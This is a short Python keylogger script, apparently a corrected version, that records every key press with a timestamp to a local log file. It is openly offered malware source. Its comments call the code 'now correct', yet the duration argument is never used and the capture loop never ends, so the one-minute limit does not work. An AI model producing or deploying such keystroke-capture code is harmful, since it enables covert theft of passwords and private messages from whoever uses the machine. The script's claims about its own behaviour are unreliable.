import keyboard
import time

def log_keystrokes():
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:   # Changed 'read_events()' to 'read_event()'
            with open('keystrokes.log', 'a') as f:
                f.write(f'{time.time()}-{event.name}\n')

def run_keylogger(duration):  # The function is now correct.
    print('Starting keylogger...')
    log_keystrokes()
    print(f'Keylogger has been running for {duration} seconds.')

def main():  # The function is now correct.
    run_keylogger(60)   # Run keylogger for 1 minute

if __name__ == '__main__':  # The if statement is now correct.
    main()